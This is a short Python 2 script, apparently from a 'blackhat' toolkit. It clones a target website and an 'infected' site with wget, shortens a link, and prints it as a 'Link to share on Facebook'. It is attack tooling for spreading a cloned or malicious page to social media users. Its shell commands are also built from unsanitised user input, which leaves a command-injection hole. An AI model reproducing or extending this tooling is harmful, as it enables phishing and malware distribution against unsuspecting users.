## www.kirkdurbin.com
## www.blackhatacademy.org

import subprocess
import urllib2
import os

def test_connection():
	try:
		response=urllib2.urlopen('http://74.125.113.99', timeout=1) #Ping Google to test Internet connection
		return True
	except urllib2.URLError as err: pass
	return False

def clone_site():
	site_clone = raw_input("Enter website to clone: ")
	infected_clone = raw_input("Enter the infected site: ")
	try:
		subprocess.Popen('rm -f tmp/clone.html', shell=True) #wget is weird and appends code rather than overwrite, so rm first
		subprocess.Popen('rm -f tmp/infected.html', shell=True)
		
		print ""
		print "[+] Cloning websites..."
		
		subprocess.Popen('cd tmp/; wget --no-check-certificate -O clone.html -N -c -k %s' % (site_clone), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
		subprocess.Popen('cd tmp/; wget --no-check-certificate -O infected.html -N -c -k %s' % (infected_clone), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
		
		print "[+] Clone complete..."
		print ""
		
		import shorten
		short_url = shorten.shorten_url()

		print ""
		print "Link to share on Facebook: " + str(short_url)
		print ""
		print ""

	except KeyboardInterrupt:
		print "[!] CTRL+C Detected. Exiting..."
	
def execute():
	
	if test_connection() == True:
		clone_site()
	else:
		print "[!] Internet connection not found."

## Main

execute()
